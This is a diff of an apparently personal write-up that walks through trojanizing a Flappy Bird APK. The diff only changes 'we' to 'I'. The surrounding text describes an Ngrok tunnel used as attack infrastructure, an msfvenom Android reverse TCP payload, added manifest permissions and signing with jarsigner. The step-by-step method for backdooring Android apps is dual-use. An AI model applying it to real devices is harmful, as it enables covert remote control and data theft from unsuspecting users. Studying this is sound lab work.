@@ -50,7 +50,7 @@ For this demonstration, a Flappy Bird APK downloaded from APKpure.com was utiliz
 
 #### Ngrok Tunnel Configuration
 
-To establish a connection pathway from the victim device to our attack infrastructure, we configured Ngrok to create a secure tunnel. 
+To establish a connection pathway from the victim device to our attack infrastructure, I configured Ngrok to create a secure tunnel. 
 Ngrok provides a public endpoint that forwards traffic to our local attack machine.
 
 **Command executed:**
@@ -66,7 +66,7 @@ This creates a TCP tunnel on port 4444, providing us with a public domain and po
 
 #### Msfvenom Payload Creation
 
-Using Metasploit's msfvenom tool, we generated a malicious Android payload configured to establish a reverse TCP connection to our Ngrok endpoint.
+Using Metasploit's msfvenom tool, I generated a malicious Android payload configured to establish a reverse TCP connection to our Ngrok endpoint.
 
 **Command executed:**
 
@@ -82,7 +82,7 @@ This generates the necessary Smali code and resources required for the reverse s
 
 #### AndroidManifest.xml Modifications
 
-**We modified the target application's AndroidManifest.xml to include the necessary permissions for network communication and system access:**
+**I modified the target application's AndroidManifest.xml to include the necessary permissions for network communication and system access:**
 ```
 <uses-permission android:name="android.permission.INTERNET" />
 <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
@@ -113,7 +113,7 @@ This ensures the malicious payload executes immediately when the application lau
 
 Digital Signature Application
 
-**Since Android requires all applications to be digitally signed, we applied a self-signed certificate:**
+**Since Android requires all applications to be digitally signed, I applied a self-signed certificate:**
 
 ```jarsigner -keystore /home/roberto/app/mykey.keystore -storepass qwerty mod.apk myalias```
 
